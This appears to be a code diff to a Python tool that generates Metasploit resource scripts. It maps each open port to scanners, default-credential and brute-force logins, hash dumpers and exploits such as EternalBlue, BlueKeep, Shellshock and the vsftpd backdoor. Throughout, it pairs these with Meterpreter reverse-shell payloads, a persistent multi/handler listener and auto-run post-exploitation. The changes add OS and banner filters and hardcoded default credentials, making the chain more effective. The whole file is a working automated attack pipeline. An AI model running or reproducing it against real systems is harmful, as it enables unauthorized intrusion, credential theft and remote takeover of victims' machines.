@@ -708,11 +708,23 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/ftp/ftp_version"},
         {"m": "auxiliary/scanner/ftp/anonymous"},
         {"m": "auxiliary/scanner/ftp/ftp_login",
-         "x": {"BLANK_PASSWORDS": "true", "USER_AS_PASS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
-        {"m": "exploit/unix/ftp/vsftpd_234_backdoor",         "p": "cmd/unix/interact",                       "post": True},
-        {"m": "exploit/unix/ftp/proftpd_133c_backdoor",       "p": "cmd/unix/interact",                       "post": True},
-        {"m": "exploit/linux/ftp/proftp_telnet_iac",          "p": "linux/x86/meterpreter/reverse_tcp",       "post": True},
-        {"m": "exploit/windows/ftp/ms09_053_ftpd_nlst",       "p": "windows/meterpreter/reverse_tcp",         "post": True},
+         "x": {"BLANK_PASSWORDS": "true", "USER_AS_PASS": "true", "STOP_ON_SUCCESS": "false",
+               "USER_FILE": "/usr/share/metasploit-framework/data/wordlists/unix_users.txt",
+               "PASS_FILE": "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"},
+         "cred": True},
+        # OS + version filters: only try specific backdoor if banner matches
+        {"m": "exploit/unix/ftp/vsftpd_234_backdoor",
+         "p": "cmd/unix/interact",           "post": True,
+         "os": "linux",  "ver": "vsftpd 2.3.4"},
+        {"m": "exploit/unix/ftp/proftpd_133c_backdoor",
+         "p": "cmd/unix/reverse",
+         "os": "linux",  "ver": "proftpd 1.3.3"},
+        {"m": "exploit/linux/ftp/proftp_telnet_iac",
+         "p": "linux/x86/meterpreter/reverse_tcp", "post": True,
+         "os": "linux",  "ver": "proftpd"},
+        {"m": "exploit/windows/ftp/ms09_053_ftpd_nlst",
+         "p": "windows/meterpreter/reverse_tcp",   "post": True,
+         "os": "windows", "ver": "microsoft ftp"},
     ],
 
     # ── SSH (22) ──────────────────────────────────────────────────────────────
@@ -723,9 +735,16 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/ssh/ssh_identify_pubkeys"},
         {"m": "auxiliary/scanner/ssh/ssh_login",
          "x": {"BLANK_PASSWORDS": "true", "USER_AS_PASS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
-        {"m": "exploit/linux/ssh/libssh_auth_bypass",         "p": "linux/x64/meterpreter/reverse_tcp",       "post": True},
-        {"m": "exploit/linux/ssh/openssh_regresshion",        "p": "linux/x64/meterpreter/reverse_tcp",       "post": True},
-        {"m": "exploit/multi/ssh/sshexec",                    "p": "cmd/unix/interact",   "cred": True,       "post": True},
+        {"m": "exploit/linux/ssh/libssh_auth_bypass",
+         "p": "linux/x64/meterpreter/reverse_tcp", "post": True,
+         "os": "linux", "ver": "libssh"},
+        {"m": "exploit/linux/ssh/openssh_regresshion",
+         "p": "linux/x64/meterpreter/reverse_tcp", "post": True,
+         "os": "linux", "ver": "openssh"},
+        # sshexec requires valid credentials (blank/user-as-pass won't work)
+        {"m": "exploit/multi/ssh/sshexec",
+         "p": "cmd/unix/interact", "cred": True, "post": True,
+         "needs_creds": True},
     ],
 
     # ── Telnet (23) ───────────────────────────────────────────────────────────
@@ -758,27 +777,31 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     # ── HTTP (80) ─────────────────────────────────────────────────────────────
     80: [
         {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "80"}},
-        {"m": "auxiliary/scanner/http/ntlm_info",              "x": {"RPORT": "80"}},
+        # ntlm_info renamed to ntlm_info_enumeration in MSF 6.4
+        {"m": "auxiliary/scanner/http/ntlm_info_enumeration",  "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/options",                "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/webdav_scanner",         "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/http_put",               "x": {"RPORT": "80"}},
-        {"m": "auxiliary/scanner/http/cert",                   "x": {"RPORT": "80"}},
+        # cert on port 80: explicitly set SSL false to avoid ECONNRESET
+        {"m": "auxiliary/scanner/http/cert",                   "x": {"RPORT": "80", "SSL": "false"}},
         {"m": "auxiliary/scanner/http/coldfusion_version",     "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/glassfish_traversal",    "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/joomla_version",         "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/tomcat_mgr_login",       "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/wordpress_xmlrpc_login", "x": {"RPORT": "80"}},
-        {"m": "auxiliary/scanner/http/phpinfo",                "x": {"RPORT": "80"}},
+        # phpinfo — removed (deprecated, not available in MSF 6.4)
         {"m": "auxiliary/scanner/http/rails_mass_assignment",  "x": {"RPORT": "80"}},
-        {"m": "auxiliary/scanner/http/apache_optionsbleed",    "x": {"RPORT": "80"}},
+        # apache_optionsbleed: only relevant on Apache servers
+        {"m": "auxiliary/scanner/http/apache_optionsbleed",    "x": {"RPORT": "80"}, "ver": "apache"},
         {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "80"}, "cred": True},
         {"m": "auxiliary/scanner/http/drupal_views_user_enum", "x": {"RPORT": "80"}},
         {"m": "auxiliary/scanner/http/grafana_plugin_traversal","x": {"RPORT": "80"}},
+        # Shellshock: Linux CGI only, and only if Apache is detected
         {"m": "exploit/multi/http/apache_mod_cgi_bash_env_exec","p": "linux/x86/meterpreter/reverse_tcp",
-         "x": {"RPORT": "80"},  "post": True},                                          # Shellshock
-        {"m": "exploit/multi/http/webdav_upload_asp",          "p": "windows/meterpreter/reverse_tcp",
-         "x": {"RPORT": "80"},  "post": True},
+         "x": {"RPORT": "80", "TARGETURI": "/cgi-bin/test.cgi"}, "post": True,
+         "os": "linux", "ver": "apache"},
+        # webdav_upload_asp — removed (deprecated, not available in MSF 6.4)
     ],
 
     # ── POP3 (110) ────────────────────────────────────────────────────────────
@@ -818,7 +841,8 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     # ── HTTPS (443) ───────────────────────────────────────────────────────────
     443: [
         {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "443", "SSL": "true"}},
-        {"m": "auxiliary/scanner/http/ntlm_info",              "x": {"RPORT": "443", "SSL": "true"}},
+        # ntlm_info renamed to ntlm_info_enumeration in MSF 6.4
+        {"m": "auxiliary/scanner/http/ntlm_info_enumeration",  "x": {"RPORT": "443", "SSL": "true"}},
         {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "443", "SSL": "true"}},
         {"m": "auxiliary/scanner/http/options",                "x": {"RPORT": "443", "SSL": "true"}},
         {"m": "auxiliary/scanner/http/webdav_scanner",         "x": {"RPORT": "443", "SSL": "true"}},
@@ -828,8 +852,10 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "443", "SSL": "true"}, "cred": True},
         {"m": "auxiliary/scanner/ssl/openssl_heartbleed",      "x": {"RPORT": "443"}},
         {"m": "auxiliary/scanner/ssl/openssl_ccs",             "x": {"RPORT": "443"}},
+        # Shellshock: Linux CGI only, and only if Apache is detected
         {"m": "exploit/multi/http/apache_mod_cgi_bash_env_exec","p": "linux/x86/meterpreter/reverse_tcp",
-         "x": {"RPORT": "443", "SSL": "true"}, "post": True},
+         "x": {"RPORT": "443", "SSL": "true", "TARGETURI": "/cgi-bin/test.cgi"}, "post": True,
+         "os": "linux", "ver": "apache"},
     ],
 
     # ── MSRPC/DCOM (135) ─────────────────────────────────────────────────────
@@ -838,7 +864,8 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/dcerpc/hidden"},
         {"m": "auxiliary/scanner/dcerpc/management"},
         {"m": "auxiliary/scanner/dcerpc/tcp_dcerpc_auditor"},
-        {"m": "exploit/windows/smb/ms03_026_dcom",             "p": "windows/meterpreter/reverse_tcp",   "post": True},
+        {"m": "exploit/windows/smb/ms03_026_dcom",
+         "p": "windows/meterpreter/reverse_tcp", "post": True, "os": "windows"},
     ],
 
     # ── SMB (445) ─────────────────────────────────────────────────────────────
@@ -851,13 +878,22 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/smb/pipe_auditor",            "cred": True},
         {"m": "auxiliary/scanner/smb/smb_login",
          "x": {"BLANK_PASSWORDS": "true", "USER_AS_PASS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
-        {"m": "exploit/windows/smb/ms17_010_eternalblue",      "p": "windows/x64/meterpreter/reverse_tcp", "post": True},
-        {"m": "exploit/windows/smb/ms17_010_psexec",           "p": "windows/x64/meterpreter/reverse_tcp", "post": True},
-        {"m": "exploit/windows/smb/ms08_067_netapi",           "p": "windows/meterpreter/reverse_tcp",     "post": True},
-        {"m": "exploit/windows/smb/ms06_040_netapi",           "p": "windows/meterpreter/reverse_tcp",     "post": True},
-        {"m": "exploit/windows/smb/ms10_061_spoolss",          "p": "windows/meterpreter/reverse_tcp",     "post": True},
-        {"m": "exploit/linux/samba/is_known_pipename",         "p": "linux/x86/meterpreter/reverse_tcp",   "post": True},
-        {"m": "exploit/multi/samba/usermap_script",            "p": "cmd/unix/interact",                   "post": True},
+        # Windows-only SMB exploits
+        {"m": "exploit/windows/smb/ms17_010_eternalblue",
+         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
+        {"m": "exploit/windows/smb/ms17_010_psexec",
+         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
+        {"m": "exploit/windows/smb/ms08_067_netapi",
+         "p": "windows/meterpreter/reverse_tcp",     "post": True, "os": "windows"},
+        {"m": "exploit/windows/smb/ms06_040_netapi",
+         "p": "windows/meterpreter/reverse_tcp",     "post": True, "os": "windows"},
+        {"m": "exploit/windows/smb/ms10_061_spoolss",
+         "p": "windows/meterpreter/reverse_tcp",     "post": True, "os": "windows"},
+        # Linux/Samba exploits
+        {"m": "exploit/linux/samba/is_known_pipename",
+         "p": "linux/x86/meterpreter/reverse_tcp",   "post": True, "os": "linux"},
+        {"m": "exploit/multi/samba/usermap_script",
+         "p": "cmd/unix/interact",                   "post": True, "os": "linux"},
     ],
 
     # ── Kerberos (88) ─────────────────────────────────────────────────────────
@@ -873,29 +909,49 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     # ── MSSQL (1433) ─────────────────────────────────────────────────────────
     1433: [
         {"m": "auxiliary/scanner/mssql/mssql_ping"},
+        # Login scanner: always try (uses BLANK_PASSWORDS + USER_AS_PASS)
         {"m": "auxiliary/scanner/mssql/mssql_login",
          "x": {"USER_AS_PASS": "true", "BLANK_PASSWORDS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
-        {"m": "auxiliary/scanner/mssql/mssql_config_enum",     "cred": True},
-        {"m": "auxiliary/scanner/mssql/mssql_hashdump",        "cred": True},
-        {"m": "auxiliary/admin/mssql/mssql_enum",              "cred": True},
-        {"m": "auxiliary/admin/mssql/mssql_enum_sql_logins",   "cred": True},
+        # Post-auth modules: default sa/"" for common misconfiguration.
+        # needs_creds: True = skip entirely if no --username provided via CLI.
+        {"m": "auxiliary/scanner/mssql/mssql_config_enum",
+         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
+        {"m": "auxiliary/scanner/mssql/mssql_hashdump",
+         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
+        {"m": "auxiliary/admin/mssql/mssql_enum",
+         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
+        {"m": "auxiliary/admin/mssql/mssql_enum_sql_logins",
+         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
         {"m": "auxiliary/admin/mssql/mssql_exec",
-         "x": {"CMD": "whoami /all"},                          "cred": True},
-        {"m": "exploit/windows/mssql/mssql_payload",           "p": "windows/x64/meterpreter/reverse_tcp",
-         "cred": True, "post": True},
-        {"m": "exploit/windows/mssql/mssql_clr_payload",       "p": "windows/x64/meterpreter/reverse_tcp",
-         "cred": True, "post": True},
+         "x": {"USERNAME": "sa", "PASSWORD": "", "CMD": "whoami /all"},
+         "cred": True, "needs_creds": True},
+        # Exploits: Windows only + needs explicit creds
+        {"m": "exploit/windows/mssql/mssql_payload",
+         "x": {"USERNAME": "sa", "PASSWORD": ""},
+         "p": "windows/x64/meterpreter/reverse_tcp", "cred": True, "post": True,
+         "os": "windows", "needs_creds": True},
+        {"m": "exploit/windows/mssql/mssql_clr_payload",
+         "x": {"USERNAME": "sa", "PASSWORD": ""},
+         "p": "windows/x64/meterpreter/reverse_tcp", "cred": True, "post": True,
+         "os": "windows", "needs_creds": True},
     ],
 
     # ── Oracle DB (1521) ─────────────────────────────────────────────────────
     1521: [
-        {"m": "auxiliary/scanner/oracle/oracle_login",         "cred": True},
+        # Default Oracle creds: system/oracle is the most common misconfiguration
+        {"m": "auxiliary/scanner/oracle/oracle_login",
+         "x": {"USERNAME": "system", "PASSWORD": "oracle"}, "cred": True},
         {"m": "auxiliary/scanner/oracle/oracle_sid"},
-        {"m": "auxiliary/admin/oracle/oracle_enum_users",      "cred": True},
-        {"m": "exploit/windows/oracle/oracle_dbms_scheduler",  "p": "windows/meterpreter/reverse_tcp",
-         "cred": True, "post": True},
-        {"m": "exploit/multi/misc/oracle_jvm_os_code_execution","p": "java/meterpreter/reverse_tcp",
-         "cred": True, "post": True},
+        {"m": "auxiliary/admin/oracle/oracle_enum_users",
+         "x": {"USERNAME": "system", "PASSWORD": "oracle"}, "cred": True},
+        {"m": "exploit/windows/oracle/oracle_dbms_scheduler",
+         "x": {"USERNAME": "system", "PASSWORD": "oracle"},
+         "p": "windows/meterpreter/reverse_tcp", "cred": True, "post": True,
+         "os": "windows", "needs_creds": True},
+        {"m": "exploit/multi/misc/oracle_jvm_os_code_execution",
+         "x": {"USERNAME": "system", "PASSWORD": "oracle"},
+         "p": "java/meterpreter/reverse_tcp",    "cred": True, "post": True,
+         "needs_creds": True},
     ],
 
     # ── NFS (2049) ────────────────────────────────────────────────────────────
@@ -933,17 +989,33 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/mysql/mysql_version"},
         {"m": "auxiliary/scanner/mysql/mysql_login",
          "x": {"USER_AS_PASS": "true", "BLANK_PASSWORDS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
+        # mysql_authbypass_hashdump: no creds needed, pure bypass attempt
         {"m": "auxiliary/scanner/mysql/mysql_authbypass_hashdump"},
-        {"m": "auxiliary/scanner/mysql/mysql_hashdump",        "cred": True},
-        {"m": "auxiliary/scanner/mysql/mysql_file_enum",       "cred": True},
-        {"m": "auxiliary/scanner/mysql/mysql_schemadump",      "cred": True},
-        {"m": "auxiliary/admin/mysql/mysql_enum",              "cred": True},
+        # Post-auth modules: default to root/"" so MSF required options are satisfied.
+        # CLI --username/--password always override these defaults (see Change 8).
+        {"m": "auxiliary/scanner/mysql/mysql_hashdump",
+         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
+        {"m": "auxiliary/scanner/mysql/mysql_file_enum",
+         "x": {"USERNAME": "root", "PASSWORD": "",
+               "FILE_LIST": "/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt"},
+         "cred": True},
+        {"m": "auxiliary/scanner/mysql/mysql_schemadump",
+         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
+        {"m": "auxiliary/admin/mysql/mysql_enum",
+         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
         {"m": "auxiliary/admin/mysql/mysql_sql",
-         "x": {"SQL": "SELECT user(), version(), @@datadir, @@global.secure_file_priv"}, "cred": True},
-        {"m": "exploit/multi/mysql/mysql_udf_payload",         "p": "linux/x64/meterpreter/reverse_tcp",
-         "cred": True, "post": True},
-        {"m": "exploit/windows/mysql/mysql_mof",               "p": "windows/meterpreter/reverse_tcp",
-         "cred": True, "post": True},
+         "x": {"USERNAME": "root", "PASSWORD": "",
+               "SQL": "SELECT user(), version(), @@datadir, @@global.secure_file_priv"},
+         "cred": True},
+        # OS-split MySQL exploits: UDF = Linux, MOF = Windows
+        {"m": "exploit/multi/mysql/mysql_udf_payload",
+         "x": {"USERNAME": "root", "PASSWORD": ""},
+         "p": "linux/x64/meterpreter/reverse_tcp", "cred": True, "post": True,
+         "os": "linux"},
+        {"m": "exploit/windows/mysql/mysql_mof",
+         "x": {"USERNAME": "root", "PASSWORD": ""},
+         "p": "windows/meterpreter/reverse_tcp",   "cred": True, "post": True,
+         "os": "windows"},
     ],
 
     # ── LDAP Global Catalog (3268/3269) ───────────────────────────────────────
@@ -954,8 +1026,10 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     3389: [
         {"m": "auxiliary/scanner/rdp/rdp_scanner"},
         {"m": "auxiliary/scanner/rdp/ms12_020_check"},
-        {"m": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce","p": "windows/x64/meterpreter/reverse_tcp", "post": True},
-        {"m": "exploit/windows/rdp/cve_2019_1182_dejablue",    "p": "windows/x64/meterpreter/reverse_tcp", "post": True},
+        {"m": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
+        {"m": "exploit/windows/rdp/cve_2019_1182_dejablue",
+         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
     ],
 
     # ── PostgreSQL (5432) ─────────────────────────────────────────────────────
@@ -963,10 +1037,16 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/postgres/postgres_version"},
         {"m": "auxiliary/scanner/postgres/postgres_login",
          "x": {"USER_AS_PASS": "true", "BLANK_PASSWORDS": "true"}, "cred": True},
+        # Default PostgreSQL creds: postgres/""
         {"m": "auxiliary/admin/postgres/postgres_sql",
-         "x": {"SQL": "SELECT version(), current_user, pg_postmaster_start_time()"}, "cred": True},
+         "x": {"USERNAME": "postgres", "PASSWORD": "",
+               "SQL": "SELECT version(), current_user, pg_postmaster_start_time()"},
+         "cred": True},
+        # CVE-2019-9193: Linux only, needs valid creds
         {"m": "exploit/multi/postgres/postgres_copy_from_program_cmd_exec",
-         "p": "cmd/unix/interact",  "cred": True, "post": True},            # CVE-2019-9193
+         "x": {"USERNAME": "postgres", "PASSWORD": ""},
+         "p": "cmd/unix/interact", "cred": True, "post": True,
+         "os": "linux", "needs_creds": True},
     ],
 
     # ── WinRM HTTP (5985) ─────────────────────────────────────────────────────
@@ -974,16 +1054,19 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/winrm/winrm_auth_methods"},
         {"m": "auxiliary/scanner/winrm/winrm_login",           "cred": True,
          "x": {"BLANK_PASSWORDS": "true"}},
-        {"m": "exploit/windows/winrm/winrm_script_exec",       "p": "windows/x64/meterpreter/reverse_tcp",
-         "x": {"FORCE_VBS": "true"},                           "cred": True, "post": True},
+        {"m": "exploit/windows/winrm/winrm_script_exec",
+         "p": "windows/x64/meterpreter/reverse_tcp",
+         "x": {"FORCE_VBS": "true"}, "cred": True, "post": True, "os": "windows"},
     ],
 
     # ── WinRM HTTPS (5986) ────────────────────────────────────────────────────
     5986: [
         {"m": "auxiliary/scanner/winrm/winrm_auth_methods",    "x": {"RPORT": "5986", "SSL": "true"}},
         {"m": "auxiliary/scanner/winrm/winrm_login",           "x": {"RPORT": "5986", "SSL": "true"}, "cred": True},
-        {"m": "exploit/windows/winrm/winrm_script_exec",       "p": "windows/x64/meterpreter/reverse_tcp",
-         "x": {"RPORT": "5986", "SSL": "true", "FORCE_VBS": "true"}, "cred": True, "post": True},
+        {"m": "exploit/windows/winrm/winrm_script_exec",
+         "p": "windows/x64/meterpreter/reverse_tcp",
+         "x": {"RPORT": "5986", "SSL": "true", "FORCE_VBS": "true"},
+         "cred": True, "post": True, "os": "windows"},
     ],
 
     # ── VNC (5900-5903) ───────────────────────────────────────────────────────
@@ -1008,7 +1091,9 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
 
     # ── IRC (6667) ────────────────────────────────────────────────────────────
     6667: [
-        {"m": "exploit/unix/irc/unreal_ircd_3281_backdoor",    "p": "cmd/unix/interact", "post": True},
+        {"m": "exploit/unix/irc/unreal_ircd_3281_backdoor",
+         "p": "cmd/unix/interact", "post": True,
+         "os": "linux", "ver": "unreal"},
     ],
 
     # ── X11 (6000) ────────────────────────────────────────────────────────────
@@ -1022,8 +1107,10 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/redis/redis_server"},
         {"m": "auxiliary/scanner/redis/redis_login",
          "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
-        {"m": "exploit/linux/redis/redis_replication_cmd_exec","p": "linux/x64/meterpreter/reverse_tcp", "post": True},
-        {"m": "exploit/linux/redis/redis_lua_sandbox_escape",  "p": "linux/x64/meterpreter/reverse_tcp", "post": True},
+        {"m": "exploit/linux/redis/redis_replication_cmd_exec",
+         "p": "linux/x64/meterpreter/reverse_tcp", "post": True, "os": "linux"},
+        {"m": "exploit/linux/redis/redis_lua_sandbox_escape",
+         "p": "linux/x64/meterpreter/reverse_tcp", "post": True, "os": "linux"},
     ],
 
     # ── WebLogic (7001/7002) ──────────────────────────────────────────────────
@@ -1296,7 +1383,9 @@ def build_msf_rc(
         # land immediately without needing a separate listener process.
         "# === Persistent Reverse Shell Handler ===",
         "use exploit/multi/handler",
-        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        # generic/shell_reverse_tcp catches sessions from ALL OS (Linux, Windows, macOS)
+        # Individual exploits use DisablePayloadHandler true to avoid port 4444 conflict
+        "set PAYLOAD generic/shell_reverse_tcp",
         f"set LHOST {lhost}",
         f"set LPORT {lport}",
         "set ExitOnSession false",       # keep handler alive for multiple sessions
@@ -1316,6 +1405,9 @@ def build_msf_rc(
         lines.append(f"set RHOSTS {target_hosts}")
         if payload:
             lines.append(f"set PAYLOAD {payload}")
+            # Prevent each exploit from trying to bind its own handler on the same port.
+            # All reverse shells are routed through the central multi/handler above.
+            lines.append("set DisablePayloadHandler true")
         if post_exploit and payload:
             lines.append(f"set AutoRunScript multi_console_command -rc {post_rc_path}")
         if extra:
@@ -1353,12 +1445,13 @@ def build_msf_rc(
                extra={"PORTS": "21,22,23,25,53,80,88,110,135,139,143,"
                                "389,443,445,464,593,636,1433,3268,3269,"
                                "3389,5985,5986,8080,8443,27017"})
-    add_module("auxiliary/scanner/smb/smb_ms17_010")
-    add_module("auxiliary/scanner/smb/smb_version")
-    add_module("auxiliary/scanner/smb/smb_enumshares")
-    add_module("auxiliary/scanner/smb/smb_enumusers")
-    add_module("auxiliary/scanner/smb/smb_lookupsid",
-               extra={"MinRID": "500", "MaxRID": "1500"})
+    # SMB baseline: only run if port 445 is actually open (avoid timeout noise)
+    # smb_lookupsid skipped — has MSF 6.4 NoMethodError bug (String vs Array)
+    if 445 in all_ports:
+        add_module("auxiliary/scanner/smb/smb_ms17_010")
+        add_module("auxiliary/scanner/smb/smb_version")
+        add_module("auxiliary/scanner/smb/smb_enumshares")
+        add_module("auxiliary/scanner/smb/smb_enumusers")
 
     # ── PORT_TO_MODULES: run ALL relevant MSF modules per open port ───────────
     # For every port detected open by nmap, iterate the full module list and
@@ -1388,15 +1481,52 @@ def build_msf_rc(
                 continue
             _port_done.add(key)
 
+            # Start with all hosts that have this port open, then narrow by filters.
+            entry_hosts = list(port_hosts)
+
+            # ── Filter 1: OS filter ────────────────────────────────────────────────
+            # "os": "linux"   → only run against hosts NOT detected as Windows
+            # "os": "windows" → only run against hosts detected as Windows
+            required_os = entry.get("os")
+            if required_os and nmap_data:
+                if required_os == "linux":
+                    entry_hosts = [ip for ip in entry_hosts if ip not in windows_hosts]
+                elif required_os == "windows":
+                    entry_hosts = [ip for ip in entry_hosts if ip in windows_hosts]
+                if not entry_hosts:
+                    continue   # No hosts match required OS — skip this module
+
+            # ── Filter 2: Version/banner match ────────────────────────────────────
+            # "ver": "vsftpd 2.3.4" → only run if nmap product for this port
+            # contains the specified substring (case-insensitive)
+            ver_match = entry.get("ver")
+            if ver_match and nmap_data:
+                entry_hosts = [
+                    ip for ip in entry_hosts
+                    if ver_match.lower() in
+                       nmap_data.get(ip, {}).get("products", {}).get(port, "").lower()
+                ]
+                if not entry_hosts:
+                    continue   # Banner doesn't match — skip version-specific exploit
+
+            # ── Filter 3: Explicit credentials required ───────────────────────────
+            # "needs_creds": True → skip module if no --username provided via CLI.
+            # Prevents post-auth modules from running when no valid creds are known.
+            if entry.get("needs_creds") and not username:
+                continue
+
+            t_hosts     = _h(entry_hosts)
             payload     = entry.get("p")
             extra_opts  = dict(entry.get("x") or {})
             inject_cred = entry.get("cred", False)
             do_post     = entry.get("post", False) and bool(payload)
 
-            # Inject credentials when provided and module supports it
-            if inject_cred and username and password:
-                extra_opts.setdefault("USERNAME", username)
-                extra_opts.setdefault("PASSWORD", password)
+            # Inject credentials when provided and module supports it.
+            # CLI creds always override any defaults set in "x" dict.
+            # If no CLI creds, defaults from "x" dict are used (e.g. root/"" for MySQL).
+            if inject_cred and username:
+                extra_opts["USERNAME"] = username
+                extra_opts["PASSWORD"] = password
 
             add_module(
                 mod,
@@ -1464,15 +1594,17 @@ def build_msf_rc(
                         extra={"SMBUser": username, "SMBPass": password},
                         post=True)
 
-        # --- MSSQL code execution (SA or domain credentials) ---
-        if mssql_hosts:
+        # --- MSSQL code execution (explicit credentials required) ---
+        # Only attempt exploitation if CLI --username is provided.
+        # Without valid creds, mssql_payload and mssql_exec will fail.
+        if mssql_hosts and username:
             lines.append("# -- MSSQL Exploitation --")
             add_win("exploit/windows/mssql/mssql_payload", mssql_hosts,
                     payload="windows/x64/meterpreter/reverse_tcp",
-                    extra={"USERNAME": username or "sa", "PASSWORD": password or ""},
+                    extra={"USERNAME": username, "PASSWORD": password},
                     post=True)
             add_win("auxiliary/admin/mssql/mssql_exec", mssql_hosts,
-                    extra={"USERNAME": username or "sa", "PASSWORD": password or "",
+                    extra={"USERNAME": username, "PASSWORD": password,
                            "CMD": "whoami /all"})
 
         # --- WinRM — PowerShell Remoting RCE (port 5985/5986) ---
@@ -1494,7 +1626,7 @@ def build_msf_rc(
             add_win("exploit/windows/iis/iis_webdav_scstoragepathfromurl", win_web,
                     payload="windows/meterpreter/reverse_tcp", post=True)
             # NTLM challenge reveal — extract domain info from IIS NTLM auth
-            add_win("auxiliary/scanner/http/ntlm_info", win_web,
+            add_win("auxiliary/scanner/http/ntlm_info_enumeration", win_web,
                     extra={"RPORT": "80"})
 
         # --- RDP exploitation (BlueKeep — CVE-2019-0708) ---
@@ -1531,11 +1663,21 @@ def build_msf_rc(
     if linux_hosts:
         lines.append("# === Linux / Unix Exploit Probes ===")
         _lh = _h(linux_hosts)
-        # Shellshock (CVE-2014-6271) — bash env variable RCE via CGI
-        add_module("exploit/multi/http/apache_mod_cgi_bash_env_exec",
-                   target_hosts=_lh,
-                   payload="linux/x86/meterpreter/reverse_tcp",
-                   post_exploit=True)
+        # Shellshock (CVE-2014-6271) — bash env via CGI, only on Apache servers
+        _web_ports = (80, 443, 8080, 8443)
+        _apache_linux = [
+            ip for ip in linux_hosts
+            if nmap_data and any(
+                "apache" in nmap_data.get(ip, {}).get("products", {}).get(p, "").lower()
+                for p in _web_ports
+            )
+        ]
+        if _apache_linux:
+            add_module("exploit/multi/http/apache_mod_cgi_bash_env_exec",
+                       target_hosts=_h(_apache_linux),
+                       payload="linux/x86/meterpreter/reverse_tcp",
+                       extra={"TARGETURI": "/cgi-bin/test.cgi"},
+                       post_exploit=True)
         # Samba (CVE-2017-7494 — SambaCry) and CVE-2007-2447
         _smb_linux = [ip for ip in linux_hosts
                       if nmap_data and 445 in nmap_data.get(ip, {}).get("ports", [])]
